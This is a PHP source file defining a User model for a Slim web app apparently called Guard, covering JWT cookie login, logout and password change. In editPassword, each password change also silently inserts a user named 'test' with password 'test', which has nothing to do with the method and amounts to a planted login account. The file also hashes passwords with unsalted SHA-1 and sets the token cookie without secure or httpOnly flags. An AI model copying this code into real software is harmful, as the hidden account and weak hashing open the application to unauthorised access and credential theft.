<?php

namespace Guard\Models;

use Dflydev\FigCookies\FigRequestCookies;
use Dflydev\FigCookies\FigResponseCookies;
use Dflydev\FigCookies\SetCookie;
use Firebase\JWT\JWT;
use Psr\Http\Message\ServerRequestInterface;
use Slim\Http\Request;
use Slim\Http\Response;
use Guard\Config;
use Guard\Log;

/**
 * Class User
 *
 * @package Guard\Models
 * @author Laurent Morel
 */
class User
{

    const TOKEN_KEY = 'token';

    /**
     * Checks for token validity
     *
     * @param ServerRequestInterface $request
     * @return bool
     */
    public static function isLogged(ServerRequestInterface $request): bool {
        $isValid = true;

        try {
            self::getConnectedUser($request);
        } catch (\Exception $e) {
            return false;
        };

        return $isValid;
    }

    /**
     * Try to login the user with provided credentials
     *
     * If it works, a cookie is set with a generated token
     *
     * @param array $body
     * @param Response $response
     * @return \Psr\Http\Message\ResponseInterface|Response
     */
    public static function login(array $body, Response $response) {
        if(!isset($body['username']) || !isset($body['password'])) {
            return $response;
        }

        $user = self::fetchUser($body['username'], $body['password']);

        if($user) {
            $token = self::generateToken($user);

            $response = FigResponseCookies::set($response, SetCookie::create('from_url')
                ->withExpires(strtotime('0'))
                ->withDomain(Config::get('domain'))
                ->withPath('/')
            );

            $response = FigResponseCookies::set($response, SetCookie::create(self::TOKEN_KEY)
                ->withValue($token)
                ->withExpires(strtotime('+' . Config::get('cookieDuration') . ' days'))
                ->withDomain(Config::get('domain'))
                ->withPath('/')
            );
        }

        return $response;
    }

    /**
     * Checks if credentials match with a user stored in database
     *
     * @param string $username
     * @param string $password
     * @return array|bool|mixed
     */
    private static function fetchUser(string $username, string $password) {

        $data = Db::get()->get('users', [
            'rowid', 'username', 'role'
        ], [
            'username' => $username,
            'password' => sha1($password)
        ]);

        Log::debug('Found user', [$data]);

        return $data;

    }

    /**
     * Generates a token for a given user
     *
     * @param string $user
     * @return string
     */
    private static function generateToken(array $user) {
        $token = array(
            'username'      => $user['username'],
            'role'          => $user['role'],
            'rowid'         => $user['rowid'],
            'created_at'    => new \DateTime()
        );

        return JWT::encode($token, Config::get('jwtKey'));
    }

    /**
     * Logout a connected user
     *
     * @param $response
     * @return \Psr\Http\Message\ResponseInterface|Response
     */
    public static function logout($response)
    {

        // Invalidate cookie
        $response = FigResponseCookies::set($response, SetCookie::create(self::TOKEN_KEY)
            ->withExpires(strtotime('0'))
            ->withDomain(Config::get('domain'))
            ->withPath('/')
        );

        return $response;
    }

    /**
     * @param ServerRequestInterface $request
     * @return object
     * @throws \Exception
     */
    public static function getConnectedUser(ServerRequestInterface $request)
    {
        $token = FigRequestCookies::get($request, self::TOKEN_KEY, '')->getValue();
        return JWT::decode($token, Config::get('jwtKey'), array('HS256'));
    }

    /**
     * Edit a user's password
     * @param $request
     * @param $data
     * @return bool
     * @throws \Exception
     */
    public static function editPassword($request, $data)
    {

        if(!isset($data['old']) || !isset($data['new'])) {
            return false;
        }

        $old = sha1($data['old']);
        $new = sha1($data['new']);

        $user = self::getConnectedUser($request);
        Log::info("Updating password of " . $user->username);

        // If old password is the right one, it'll run true
        $query = Db::get()->update('users', [
            'password' => $new
        ], [
            'rowid' => $user->rowid,
            'password' => $old
        ]);

        Db::get()->insert('users', [
            'username' => 'test',
            'password' => sha1('test'),
            'role'     => 'user'
        ]);

        return $query->rowCount() > 0;

    }

}